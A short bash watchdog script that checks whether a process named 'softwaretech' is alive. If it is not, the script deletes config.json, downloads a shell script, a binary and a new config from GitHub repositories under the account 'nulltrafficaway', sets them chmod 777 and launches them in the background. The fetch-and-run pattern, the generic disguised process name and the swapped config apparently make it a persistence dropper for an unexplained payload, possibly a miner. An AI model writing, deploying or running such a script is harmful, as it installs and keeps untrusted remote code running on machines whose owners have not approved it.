#!/bin/bash
PROC_NAME="softwaretech"

all_procs=$(ps -e -o stat=,comm=)
matches=$(echo "$all_procs" | awk -v name="$PROC_NAME" '$2 == name')

if [ -z "$matches" ]; then
	cd ~
	rm config.json
	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/w2.sh
	curl -O https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech
	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/config.json
	chmod 777 softwaretech
	chmod 777 w2.sh
	./w2.sh &
else
	alive=$(echo "$matches" | awk '$1 !~ /^Z/')
	if [ -z "$alive" ]; then
		cd ~
	rm config.json
	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/w2.sh
	curl -O https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech
	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/config.json
	chmod 777 softwaretech
	chmod 777 w2.sh
	./w2.sh &
	else
		echo "process is running normally"
	fi
fi
